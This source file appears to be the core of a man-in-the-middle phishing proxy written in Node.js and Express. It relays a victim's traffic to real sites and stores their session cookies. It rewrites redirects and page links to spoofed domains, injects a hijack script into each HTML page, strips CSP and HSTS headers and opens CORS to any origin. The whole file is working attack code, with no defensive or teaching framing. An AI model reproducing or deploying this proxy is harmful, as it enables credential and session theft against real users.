const express = require('express')
const zlib = require('zlib')
const Transform = require('stream').Transform
const request = require('request')/*.defaults({
  proxy: 'http://localhost:8080'
})*/

const urlUtils = require('./utils/urls')
const cookieUtils = require('./utils/cookies')

module.exports = () => {
  const router = express.Router();

  router.use('/', (req, res) => {
    console.log(req.method.toLowerCase(), req.url)

    //set the cookie header for this session
    req.headers.cookie = cookieUtils.cookiesToHeaderStr(Object.assign(req.session.cookies[req._domain] || {}, req.cookies))
    
    //make the request to the real url
    req.pipe(request[req.method.toLowerCase()](req.url)).on('response', (response) => {
      //store new cookies
      cookieUtils.setCookies(req.session.cookies, req._domain, response.headers['set-cookie'])

      if(req.session.update){
        cookieUtils.addSessionCookie(response.headers['set-cookie'], req.cookies[process.env.SESS_COOKIE], req._domain)
      }

      //hijack redirect urls
      if(response.statusCode === 301 || response.statusCode === 302){
        response.headers['location'] = urlUtils.convertUrlToSpoofed(response.headers['location'])
      }

      //set status code to that from piped response
      res.status(response.statusCode)

      //hijack URLs in html responses
      if(response.headers['content-type'] && ~response.headers['content-type'].indexOf('text/html')){
        //creates new transform stream to hijack urls in html
        const urlHijackTransformStream = new TransformStream()
        //url hijacking function needs to know whether the originally requested url is an https request
        urlHijackTransformStream.secure = req.url.indexOf('https://') === 0

        //unzip encoded content before hijacking urls in html
        switch (response.headers['content-encoding']) {
          case 'gzip':
          case 'deflate':
            //delete content-encoding header because it has been unzipped
            delete response.headers['content-encoding']
            //set headers on response object before piping result of url hijacks
            res.set(updateResponseHeaders(response.headers))
            //pipe response into unzip stream and url hijack transform stream
            response.pipe(zlib.createUnzip()).pipe(urlHijackTransformStream).pipe(res)
            break
          default:
            //set headers on response object before piping result of url hijacks
            res.set(updateResponseHeaders(response.headers))
            //pipe response into unzip stream and url hijack transform stream
            response.pipe(urlHijackTransformStream).pipe(res)
            break
        }
      }else{
        //set headers on response object before piping response
        res.set(updateResponseHeaders(response.headers))
        //pipe responses back to victim without modification
        response.pipe(res)
      }
    })
  })

  return router
}

//injects scripts to be loaded in the response to the victim
function injectScripts(source){
  return source.replace('</head', getSubDomainVars() + '<script src="/hijacks.js" type="text/javascript"></script>' + '</head')
}

//gets spoofed domain prefixes to load in the response to the victim
function getSubDomainVars(){
  return `<script type="text/javascript">
    var spoofedDomains = ${JSON.stringify(urlUtils.spoofedDomains)};
    var prefixToSpoofedDomain = ${JSON.stringify(urlUtils.prefixToSpoofedDomain)};
    var sessCookieName = "${process.env.SESS_COOKIE}";
  </script>`
}

//update response headers to loosen security
function updateResponseHeaders(headers){
  if(headers['Access-Control-Allow-Origin']){
    headers['Access-Control-Allow-Origin'] = urlUtils.convertUrlToSpoofed(headers['Access-Control-Allow-Origin']) || '*'
  }else if(headers['access-control-allow-origin']){
    headers['access-control-allow-origin'] = urlUtils.convertUrlToSpoofed(headers['access-control-allow-origin']) || '*'
  }else{
    headers['access-control-allow-origin'] = '*'
  }
  delete headers['content-security-policy']
  delete headers['Content-Security-Policy']
  //on the off chance this is their first time accessing this domain and its not in a preloaded STS list
  delete headers['strict-transport-security']
  delete headers['Strict-Transport-Security']
  return headers
}

//Transform stream used to hijack urls in html responses
class TransformStream extends Transform {
  constructor(options) {
    super(options)
  }

  /*Transforms urls in each chunk. 
    In case a url is split across chunks, it finds the index of the last space in 
    the chunk and prepends it to the next chunk before modifying.*/
  _transform(chunk, encoding, done) {
    let chunkStr = chunk.toString()

    //if the previous chunk had content after the last space prepend it to this chunk
    if(this.remainderPrevChunk){
      chunkStr = this.remainderPrevChunk + chunkStr
      this.remainderPrevChunk = ''
    }

    //only push current chunk up to last whitespace (in case url is split across chunks)
    const indexLastSpace = chunkStr.lastIndexOf(' ')
    if(indexLastSpace === -1){
      //hijack any urls in this chunk
      chunkStr = urlUtils.hijackUrls(chunkStr, this.secure)
    }else{
      //store remainder of chunk after last index of space to prepend to next chunk
      this.remainderPrevChunk = chunkStr.slice(indexLastSpace)
      //hijack any urls in this chunk
      chunkStr = urlUtils.hijackUrls(chunkStr.slice(0, indexLastSpace), this.secure)
    }

    //inject client side scripts. This is done after hijacking urls to prevent hijacking the contents of these scripts
    if(!this.scriptsInjected && ~chunkStr.indexOf('</head')){
      chunkStr = injectScripts(chunkStr)
      this.scriptsInjected = true
    }

    this.push(chunkStr)

    done()
  }

  //called after last chunk was received
  _flush(done){
    //if the previous chunk had content after the last space we need to write it to the stream
    if(this.remainderPrevChunk){
      this.push(this.remainderPrevChunk)
    }
    done()
  }
}